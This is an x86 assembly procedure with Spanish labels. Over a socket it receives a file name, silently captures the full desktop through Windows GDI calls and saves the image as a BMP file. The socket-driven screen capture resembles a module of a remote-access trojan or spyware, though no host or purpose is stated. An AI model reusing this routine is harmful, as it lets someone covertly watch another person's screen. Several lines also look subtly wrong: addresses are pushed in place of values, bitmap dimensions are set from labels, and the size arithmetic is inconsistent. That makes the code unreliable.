proc Capturar sock

push PideArchivo
push [sock]
call EnviarDatos
push Buffer
push [sock]
call RecibirDatos
cmp eax,-1
je fin_capturar
;obtenemos las dimensiones de la pantalla
push 0
call GetSystemMetrics
mov [Ancho],eax
push 1
call GetSystemMetrics
mov [Alto],eax

call GetDesktopWindow
mov [Hwnd],eax
push Hwnd
call GetDC
mov [hDC],eax
push hDC
call CreateCompatibleDC
mov [memDC],eax
push Alto
push Ancho
push hDC
call CreateCompatibleBitmap
mov [hBM],eax
push hBM
push memDC
call SelectObject
mov [hBMOld],eax
push 0x00CC0020;SCRCOPY
push 0
push 0
push hDC
push Alto
push Ancho
push 0
push 0
push memDC
call BitBlt
mov [bmi.bmiHeader.biSize],0x28
mov eax,[Ancho]
mov [bmi.bmiHeader.biWidth],Ancho
mov eax,[Alto]
mov [bmi.bmiHeader.biHeight],Alto
mov [bmi.bmiHeader.biBitCount],0x18
mov [bmi.bmiHeader.biPlanes],1
mov [bmi.bmiHeader.biCompression],0;BI_RGB
imul eax,[Ancho]
imul eax,0x20
shl eax,2
mov [bmi.bmiHeader.biSizeImage],eax
imul eax,4
push 0x40
push eax
call LocalAlloc
mov [pbBits],eax

push 0;DIB_RGB_COLORS
push bmi
push [pbBits]
push Alto
push 0
push [hBM]
push [memDC]
call GetDIBits

mov [bfh.bfType],0x4D42;('M' << 8) + 'B'
mov eax,0x36;sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)
add eax,[bmi.bmiHeader.biSizeImage]
mov [bfh.bfReserved1],0
mov [bfh.bfReserved2],0
mov [bfh.bfOffBits],0x36;sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)

;guardamos la captura
push 0
push 0
push 4;OPEN_ALWAYS
push 0
push 0
push 0x40000000;GENERIC_WRITE
push Buffer
call CreateFile
push eax
push 0
push 0
push 0x0E
push bfh
push eax
call WriteFile
pop eax
push eax
push 0
push 0
push 0x28
lea esi,dword [bmi.bmiHeader]
push esi
push eax
call WriteFile
pop eax
push eax
push 0
push 0
push [bmi.bmiHeader.biSizeImage]
push pbBits
push eax
call WriteFile
pop eax
push eax
call CloseHandle

push [hBMOld]
push [memDC]
call SelectObject
push memDC
call DeleteDC
push hDC
push Hwnd
call ReleaseDC
push hBM
call DeleteObject
push pbBits
call LocalFree

fin_capturar:
ret
endp